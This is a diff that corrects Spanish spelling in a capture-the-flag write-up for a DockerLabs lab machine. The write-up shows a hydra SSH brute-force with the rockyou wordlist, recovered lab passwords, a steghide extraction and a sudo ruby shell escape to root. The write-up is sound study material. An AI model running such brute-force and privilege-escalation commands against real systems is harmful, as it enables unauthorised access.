@@ -40,12 +40,12 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Con esta información me doy cuenta que las versiones de los servicios son relativamente recientes.  
   
-Me dispongo, entonces, a buscar información dentro de la **Pàgina WEB de Apache** que contiene el servidor, la pagina contiene varios mensajes parecidos a los de un archivo de logs. Entre ellos hay un mensaje donde puedo sospechar un posible usuario, o incluso que dos:
+Me dispongo, entonces, a buscar información dentro de la **Página WEB de Apache** que contiene el servidor, la página contiene varios mensajes parecidos a los de un archivo de logs. Entre ellos hay un mensaje donde puedo sospechar un posible usuario, o incluso que dos:
   
 <img width="980" height="177" alt="Usuario" src="https://github.com/user-attachments/assets/816165ef-a912-4746-9343-1b7aa082a11a" />
 
 ## Fase de Explotación
-Como no encuentro otra vulnerabilidad investigando la pàgina, decido utilizar la herramienta `hydra` para hacer fuerza bruta con uno de los usuarios que he detectado:
+Como no encuentro otra vulnerabilidad investigando la página, decido utilizar la herramienta `hydra` para hacer fuerza bruta con uno de los usuarios que he detectado:
 ```bash
 > hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
 ---
@@ -53,7 +53,7 @@ Como no encuentro otra vulnerabilidad investigando la pàgina, decido utilizar l
 ```
 - La contraseña es: **babygirl**
 
-Procedo a entrar al servidor con el usuario **carlota** y la password **babygirl**:  
+Procedo a entrar al servidor con el usuario **carlota** y el password **babygirl**:  
 ```bash
 > ssh carlota@172.17.0.2
 ```
@@ -66,7 +66,7 @@ Información que logro ver:
 ```bash
 export SECRET="Hola oscar, recuerdas las  \"vacaciones\" que pasamos juntos? En el interior de nuestro amor hay un secreto. ¿Entiendes?"
 ```
-- Exploro el directorio '/vacaciones/' hasta encontrar una imagen, decido descargarmela en mi maquina:
+- Exploro el directorio '/vacaciones/' hasta encontrar una imagen, decido descargarmela en mí máquina:
 ```bash
 > scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg .
 ```
@@ -84,7 +84,7 @@ Extrajo una cadena de caracteres que te deja pensar que es un password. Descubr�
 ---
 eslacasadepinypon
 ```
-Como anteriormente descubrí que en el servidor también se encontraba el usuario **oscar**, comprobé si la contraseña le pretenecía a ese usuario:
+Como anteriormente descubrí que en el servidor también se encontraba el usuario **oscar**, comprobé si la contraseña le pertenecía a ese usuario:
 ```bash
 > ssh oscar@172.17.0.2
 ```
@@ -95,7 +95,7 @@ El password es del usuario **oscar**, pude entrar en la maquina como **oscar** y
 User oscar may run the following commands on 31e119053bcc:
     (ALL) NOPASSWD: /usr/bin/ruby
 ```
-Se puede ver que el usuario **oscar** puede ejecutar comando del sistema utilizando `ruby`. Decidi buscar una comanda en **GTFOBins** y ejecutarla:
+Se puede ver que el usuario oscar puede ejecutar comando del sistema utilizando ruby. Decidí buscar una comanda en GTFOBins y ejecutarla:
 ```bash
 > sudo ruby -e 'exec "/bin/sh"'
 > whoami
@@ -103,5 +103,5 @@ Se puede ver que el usuario **oscar** puede ejecutar comando del sistema utiliza
 root
 ```
 
-## Comantarios
-Es la segunda maquina que realizo en DockerLabs de dificultad Fácil y siento que he controlado bastante el proceso. En esta CTF he descubierto la herramienta `stgehide` y he aprendido para que sirve y como utilizarla.
+## Comentarios
+Es la segunda máquina que realizo en DockerLabs de dificultad Fácil y siento que he controlado bastante el proceso. En esta CTF he descubierto la herramienta stgehide y he aprendido para qué sirve y como utilizarla.
